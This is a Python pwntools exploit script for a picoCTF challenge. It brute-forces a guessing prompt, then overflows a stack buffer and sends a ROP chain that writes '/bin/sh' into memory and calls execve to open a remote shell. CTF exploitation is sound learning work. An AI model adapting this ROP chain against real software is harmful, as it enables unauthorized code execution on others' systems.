from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools


####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './vuln'
REMOTE_BIN = '~/vuln' #For ssh

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('jupiter.challenges.picoctf.org',50581) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *0x400c6c')



##########################
##### OFFSET FINDER ######
##########################

OFFSET = b'A'*0x78
if OFFSET == b'':
    gdb.attach(P.pid, 'c') #Attach and continue
    payload = cyclic(264)
    payload += b'AAAAAAAA'
    print(P.clean())
    P.sendline(payload)
    #x/wx  -- Search for bytes that crashed the application
    #print(cyclic_find(0x63616171)) # Find the offset of those bytes
    P.interactive()
    exit()



#####################
#### Find Gadgets ###
#####################
SYSCALL_ADDR = (ROP_LOADED.find_gadget(['syscall']))[0]
POP_RAX_ADDR = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]
POP_RDX_ADDR = (ROP_LOADED.find_gadget(['pop rdx', 'ret']))[0]
POP_RDI_ADDR = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI_ADDR = (ROP_LOADED.find_gadget(['pop rsi', 'ret']))[0]
MOV_RDX_TO_RAX_ADDR = 0x000000000048dd71

log.info('mov rdx to rax address: ' + hex(MOV_RDX_TO_RAX_ADDR))

##############################
##### FINAL EXPLOITATION #####
##############################

P.recvline()
P.recvline()
P.recvline()
while True:
	P.sendline(b'87')
	receive = P.recvline()
	P.recvline()
	P.recvline()
	print(receive)
	if b'Nope!' not in receive:
		break


BINSH = b"/bin/sh\x00"

def write_mem(value, addr):
    if type(value) == int: value = p64(value)
    payload = p64(POP_RDX_ADDR) + value
    payload += p64(POP_RAX_ADDR) + p64(addr)
    payload += p64(MOV_RDX_TO_RAX_ADDR)
    return payload
    


SAFE_ADDR = 0x006ba128
SAFE_ADDR2 = 0x006ba7b0
#Write BINSH into SAFE_ADDR
payload = OFFSET
payload += write_mem(BINSH, SAFE_ADDR)

#Write SAFE_ADDR into SAFE_ADDR2
payload += write_mem(SAFE_ADDR, SAFE_ADDR2)

#Populate registers for the syscall
payload += p64(POP_RAX_ADDR) + p64(0x3b)
payload += p64(POP_RDI_ADDR) + p64(SAFE_ADDR) + p64(POP_RSI_ADDR) + p64(SAFE_ADDR2) + p64(POP_RDX_ADDR) + p64(0x0)

#Syscall
payload += p64(SYSCALL_ADDR)

print(payload)

P.sendline(payload)


P.interactive() #Interact with your shell :)
